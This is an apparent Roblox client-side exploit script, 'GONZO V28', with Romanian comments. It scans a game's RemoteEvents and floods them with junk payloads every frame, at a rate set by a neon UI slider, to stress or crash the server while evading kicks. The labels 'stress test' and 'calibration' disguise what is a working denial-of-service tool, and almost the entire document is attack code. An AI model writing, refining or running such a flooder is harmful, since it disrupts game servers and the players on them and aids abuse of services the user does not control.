-- GONZO V28: PRECISION STRESSER (ANTI-KICK CALIBRATION)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

-- 1. TARGETS DIN SCANARE (Filtrăm EventService)
local targets = {}
for _, v in pairs(ReplicatedStorage:GetDescendants()) do
    if v:IsA("RemoteEvent") and not v:GetFullName():find("EventService") then
        table.insert(targets, v)
    end
end

-- 2. PAYLOAD STABIL
local payload = {tick(), "STRESS_TEST"}

-- --- UI MOV NEON V28 ---
local sg = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
sg.Name = "Gonzo_V28_Calibrator"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 320, 0, 380)
main.Position = UDim2.new(0.1, 0, 0.3, 0)
main.BackgroundColor3 = Color3.fromRGB(10, 0, 20)

local stroke = Instance.new("UIStroke", main)
stroke.Color = Color3.fromRGB(180, 0, 255)
stroke.Thickness = 4

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 50)
title.Text = "GONZO V28: LIMIT FINDER"
title.TextColor3 = Color3.fromRGB(200, 100, 255)
title.BackgroundColor3 = Color3.fromRGB(20, 0, 40)
title.Font = Enum.Font.GothamBlack
title.TextSize = 18

-- --- SLIDER DE INTENSITATE (0 - 1000) ---
local function CreateSlider(name, pos, maxVal)
    local frame = Instance.new("Frame", main)
    frame.Size = UDim2.new(0.85, 0, 0, 45)
    frame.Position = pos
    frame.BackgroundTransparency = 1
    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, 0, 0, 25)
    label.Text = name .. ": 0"
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.BackgroundTransparency = 1
    local bar = Instance.new("Frame", frame)
    bar.Size = UDim2.new(1, 0, 0, 6)
    bar.Position = UDim2.new(0, 0, 0.7, 0)
    bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    local knob = Instance.new("TextButton", bar)
    knob.Size = UDim2.new(0, 16, 0, 16)
    knob.Position = UDim2.new(0, -8, 0.5, -8)
    knob.BackgroundColor3 = Color3.fromRGB(180, 0, 255)
    knob.Text = ""
    local val = 0
    knob.MouseButton1Down:Connect(function()
        local move = UserInputService.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement then
                local p = math.clamp((input.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
                knob.Position = UDim2.new(p, -8, 0.5, -8)
                val = math.floor(p * maxVal)
                label.Text = name .. ": " .. val
            end
        end)
        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
    end)
    return function() return val end
end

local GetIntensity = CreateSlider("PACKETS PER FRAME", UDim2.new(0.075, 0, 0.25, 0), 50)

local btn = Instance.new("TextButton", main)
btn.Size = UDim2.new(0.85, 0, 0, 60)
btn.Position = UDim2.new(0.075, 0, 0.65, 0)
btn.Text = "START CALIBRATION"
btn.BackgroundColor3 = Color3.fromRGB(40, 0, 80)
btn.TextColor3 = Color3.new(1, 1, 1)
btn.Font = Enum.Font.GothamBlack

-- --- MOTOR DE EXECUȚIE ---
local active = false
btn.MouseButton1Click:Connect(function()
    active = not active
    btn.Text = active and "TESTING LIMITS..." or "START CALIBRATION"
    btn.BackgroundColor3 = active and Color3.fromRGB(160, 32, 240) or Color3.fromRGB(40, 0, 80)
end)

RunService.Heartbeat:Connect(function()
    if active and #targets > 0 then
        local amount = GetIntensity() -- Câte pachete trimitem la fiecare frame
        for i = 1, amount do
            local remote = targets[math.random(1, #targets)]
            pcall(function()
                remote:FireServer(payload)
            end)
        end
    end
end)
